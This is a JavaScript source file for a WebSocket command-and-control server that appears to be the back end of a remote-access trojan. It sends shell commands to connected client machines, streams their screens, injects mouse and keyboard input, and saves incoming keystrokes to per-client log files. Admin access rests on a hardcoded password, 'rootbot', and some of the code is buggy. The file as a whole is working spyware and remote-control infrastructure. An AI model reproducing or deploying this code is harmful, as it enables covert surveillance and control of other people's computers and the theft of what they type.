//create a websocket server
const fs = require('fs');
const WebSocket = require('ws').Server;
const wss = new WebSocket({ port: 8080 });
const express = require('express');
const path = require('path');
var connections = [];
var piConnections = [];
var target = '';
const Connection = require('./Utils/Connection');
const PiConnection = require('./Utils/PiConnection');
const app = express();
const port = process.env.PORT || 3010;
let allowedSend = true;
let targetScreen = '';


app.get('/', function(req, res) {
    res.sendFile(path.join(__dirname, '/index.html'));
  });
  const sendCommand = (name, command) => {
    connections.forEach(connection => {
        if (connection.name === name) {
            connection.send({ type: 'command', cmd: command });
        }
    });

}
const sendPiCommand = (name, command) => {
    piConnections.forEach(connection => {
        if (name.includes(connection.name)) {
            connection.send({ type: 'command', cmd: command });
        }
    });

}
const startCapture = (name) => {
    piConnections.forEach(connection => {
        if (name.includes(connection.name)) {
            targetScreen = name;
            connection.send({type:'screen-start'});
        }
    });
}
const stopCapture = (name) => {
    piConnections.forEach(connection => {
        if (name.includes(connection.name)) {
            targetScreen = '';
            connection.send({type:'screen-stop'});
        }
    });
}
  
  app.listen(port);
  const getWsName = (ws) => {
      connections.forEach(element => {
            if(element.ws == ws){
                return element.name;
            }
        });
        piConnections.forEach(element => {
            if(element.ws == ws){
                return element.name;
            }
        });
    }

  setInterval(() => {
      connections.forEach(connection => {
        connection.timer -= 1000;   
        if(connection.timer <= 0){
            //remove connection
            connections = connections.filter(c => c.name !== connection.name);
        }
      })
      piConnections.forEach(connection => {
        connection.timer -= 1000;   
        if(connection.timer <= 0){
            //remove connection
            piConnections = piConnections.filter(c => c.name !== connection.name);
        }
      })
    
  }, 1000);
wss.on('connection', function connection(ws) {


    //ws.send(Date.now());
    ws.onclose = function() {
        connections = connections.filter(c => c.ws !== ws);
        piConnections = piConnections.filter(c => c.ws !== ws);

    }
    ws.on('message', function incoming(message) {
        //check if message is a string
        if(typeof message === 'string'){
            //check if message is a json
            try{
                message = JSON.parse(message);
                console.log(message);
            }catch(e){
                console.log(e);
            }
        }else{
            //message is a buffer it needs to be a byte array
            message = new Uint8Array(message);
            
            //string from byte array
            if(message.byteLength < 3000 && message[0] !== 5)
            {
            message = String.fromCharCode.apply(null, message);
            try{
                message = JSON.parse(message);
                if(message.type === 'command-response')
                {
                    console.log(message.data);
                }
               
            }catch(e){
                console.log(e);
            }

        }else{
            if(message[0] == 5){
                piConnections.forEach(connectioncam => {
                connections.forEach(connection => {
                    if(connection.admin&& targetScreen.includes(connectioncam.name)){
                        //send message minus first byte
                        connection.sendBytes(new Uint8Array(message.slice(1)));
                    }
                });
            });
                //this is a screen capture
                //console.log('capturing screen ' + name);
                //startCapture(name);
            }
        }
            
            
        }
        switch (message.type) {
            case 'handshake':
                let admin = false;
               
                if(message.pass && message.pass === 'rootbot'){
                    admin = true;
                }
                if(message.py ){
                    piConnections.push(new PiConnection(message.data, ws,0,admin));
                    console.log('handshake ', message.data)
                    if(targetScreen.includes(message.data)){
                        startCapture(message.data);
                    }
                }
                else{
                connections.push(new Connection(message.data, ws,0,admin));
                console.log('handshake ', message.data)
                }
                break;
            case 'response':
                console.log('response');
                console.log(message.data);        
                break;
            case 'keyboard-input':
                console.log(message.data);
                fs.writeFile("/logs/"+getWsName(ws)+'.txt',message.data, function(err) {
                    if(err) {
                        return console.log(err);
                    }
                }); 
                break;
            case 'click':
                if(message.data.pass&&message.data.pass === 'rootbot'){

                    //send the click the the piConnection Object
                    piConnections.forEach(connection => {
                        if(connection.name.includes(targetScreen)){
                            connection.send({type:'click',data:message.data});
                        }
                    });
                }
                break;
            case 'doubleclick':
                if(message.data.pass&&message.data.pass === 'rootbot'){

                    //send the click the the piConnection Object
                    piConnections.forEach(connection => {
                        if(connection.name.includes(targetScreen)){
                            connection.send({type:'doubleclick',data:message.data});
                        }
                    });
                }
                break;
            case 'move':
                if(message.data.pass&&message.data.pass === 'rootbot'){

                    //send the click the the piConnection Object
                    piConnections.forEach(connection => {
                        if(connection.name.includes(targetScreen)){
                            connection.send({type:'move',data:message.data});
                        }
                    });
                }
                break;
            case 'keypress':
                if(message.data.pass&&message.data.pass === 'rootbot'){
                    piConnections.forEach(connection => {
                        if(connection.name.includes(targetScreen)){
                            connection.send({type:'keypress',data:message.data});
                        }
                    });
                    
                }
                break;

            case 'command-response':
                console.log(message.data);
                break;

            case 'screen-capture':
                //find admin connection and send the data to it
                
                break;
                case 'ping':
                    connections.forEach(connection => {
                        if(connection.ws === ws){
                            connection.timer = 10000;
                        }
                        
                    })
                    piConnections.forEach(connection => {
                        if(connection.ws === ws){
                            connection.timer = 10000;
                        }
                    })
                break;
            default:
                break;
        }
    });
    });
    

    
    //get input from command line
    const readline = require('readline');
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.on('line', (line) => {
        let words = line.split(' ');
        let command = words[0];
        let name = words[1];
        const buildCommand = (index) => {
            let commd = '';
            for (let i = index; i < words.length; i++) {
                commd += words[i] + ' ';
            }
            return commd;
        }


        //the problem is cmd has more than one word so the fix for that is
        let cmd = (target==''?buildCommand(2):buildCommand(1));
        let peekCommand = words[2];

        switch (command) {
            case 'send':
                sendCommand(target!=''?target:name, cmd);
                break;
            case 'sendpi':
                sendPiCommand(target!=''?target:name, cmd);
                break;
            case 'list':
                connections.forEach(connection => {
                    console.log(connection.name)
                });
                piConnections.forEach(connection => {
                    console.log(connection.name + ' (pi)')
                });
            case 'tg':
                target = name;
                break;
            case 'peek':
                if(peekCommand === 'stop'){
                    stopCapture(name);
                }else{
                    startCapture(name);
                }
               
                break;

            case 'help':
                //explain how the program works
                console.log('===========================');
                console.log('Send command to remote PC: send <name> <command>');
                console.log(`List connected remote pc's: list`);
                console.log('Target Remote PC: tg <name>');
                console.log('===========================');
                console.log('If a target is set, the send command needs to be used like: send <command>');
                console.log('===========================');
                console.log('Help: help');
                console.log('===========================');
        

            case 'exit':
                process.exit();
                break;
            default:
                break;
        }
    });